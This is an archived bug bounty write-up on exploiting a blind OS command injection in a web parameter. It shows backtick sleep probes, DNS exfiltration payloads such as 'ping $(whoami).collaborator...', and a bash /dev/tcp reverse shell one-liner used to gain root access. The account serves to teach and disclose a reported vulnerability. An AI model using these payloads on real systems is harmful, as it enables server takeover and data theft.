---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-08-12_blind-os-command-injection.md
original_filename: 2020-08-12_blind-os-command-injection.md
title: Blind OS Command Injection
category: documents
detected_topics:
- command-injection
- api-security
tags:
- imported
- documents
- command-injection
- api-security
language: en
raw_sha256: 99df3089398722ecd883bb671fc9335b563eebfd91448b919a1ef45a197da9b4
text_sha256: bfb5b510aaa9f6ce184ec378f956fc87ec218d6b673535e4430ec888ac649b82
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# Blind OS Command Injection

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-08-12_blind-os-command-injection.md
- Source Type: markdown
- Detected Topics: command-injection, api-security
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `99df3089398722ecd883bb671fc9335b563eebfd91448b919a1ef45a197da9b4`
- Text SHA256: `bfb5b510aaa9f6ce184ec378f956fc87ec218d6b673535e4430ec888ac649b82`


## Content

---
title: "Blind OS Command Injection"
url: "https://medium.com/@ashikbhaskar94/blind-os-command-injection-87910f0d2276"
authors: ["Ashik B"]
bugs: ["OS command injection"]
publication_date: "2020-08-12"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4328
scraped_via: "browseros"
---

# Blind OS Command Injection

Blind OS Command Injection
Ashik
Follow
4 min read
·
Aug 12, 2020

137

2

Hola everyone,

Hope you all are doing well, amidst the global pandemic.

This article is about an interesting approach towards successful exploitation of a blind OS Command Injection scenario.

Quick Explanation:
OS command injection is a web security vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, and typically, fully compromise the server or application and all its data.

Disclaimer: As usual, he data involved is confidential and is not disclosed.

The Intro

Sometimes, the anomalies in the application behaviour pave way to discover good vulnerabilities (By ‘good’, of course, I mean with respect to the impact caused😄). Be it across any platform/application, one should always look out for suspicious behaviours and unexpected responses from the server.

I was intrigued by a behaviour of the server, where it was actually responding to a “sleep” command in a parameter of a POST request. Few things to note here:
• It was not even a request for performing an action/operation which would require interaction with the OS or a command execution i.e, It was just another request with just a casual parameter without an eye-catchy name, nothing to be suspicious about.
• The sleep command would not work if entered directly as the parameter value, but would work inside a pair of back ticks (`).
• The payload was URL encoded.

Press enter or click to view image in full size
A command `sleep 10` (to sleep for 10 seconds) is sent in the vulnerable parameter.

The Dig In

The ‘`sleep 10`' command did work and the server responded after 10 seconds. Furthermore, things that had to be checked were:
1. Modifying the ‘10’ to ‘X’ and seeing if the server actually responds after ‘X’ seconds (to make sure it’s not the latency or any other behaviour).
2. Upon succession, checking if any other command, other than ‘sleep’, works. If it does, where does the command result appear?

It was time to test for ‘X’ seconds and ‘ping’ command with a personally hosted domain or a collaborator server.

As luck would have it, the server did respond after ‘X’ seconds which led me to try out the ping command in conjunction with the Burp Suit collaborator client.

Press enter or click to view image in full size
A ping command is sent, to reach out the collaborator server.

Fortunately, the collaborator server did receive a DNS interaction from the application server, however, the response did not show/mean anything with respect to the ping command’s result.

The collaborator server received a DNS lookup from the target application server.

This made one thing concrete, that it was a Blind Command Injection.

The Probe

Some initial reconnaissance and fuzzing did shell out some nice information regarding the technology stack of the application and some server path disclosure as well. It was a Linux machine at the back-end. If it was not for this information, I would have had to figure out what the back-end OS and application technology stack were using other tools or methods, as it plays a significant role when it comes to exploiting further.

Get Ashik’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

The use case was blind, meaning, even though it was possible to execute commands, it was not possible to see its results.

I started thinking about how to proceed further and a very good friend o’mine suggested me to use the DNS interaction to extract information via command substitution method.

Upon using that, the payload would look something like below:
`ping $(whoami).collaborator_server_dot_com`

To my surprise, it did work and it was pretty cool! This synced up with the earlier recon, as command substitution works only on Linux.

Press enter or click to view image in full size
The dns lookup is used to read command results.

The Sneak In

Now, there is a jackpot ahead as this command execution is happening by “root” user privileges. But what next?

I did play around & tried few more commands as shown below:
`ping $(date).collaborator_dot_com` → date
`ping $(pwd).collaborator_dot_com`→ present working directory
`curl collaborator_dot_com`→ curl command
`ping $(id).collaborator_dot_com`→ user ID

It was time to get a reverse shell and I quickly hosted a ngrok server and set up a netcat listener on my machine. A simple bash one liner reverse shell was used as the payload, to obtain a reverse shell as shown below:

`/bin/sh -i >& /dev/tcp/my_ip>/my_port 0>&1`

Press enter or click to view image in full size

The issue was reported as a High/Critical severity issue, although the attack was carried out by an authenticated user.

I believe this is insightful and any feedback(s) are always welcome!

Ciao, until next time!
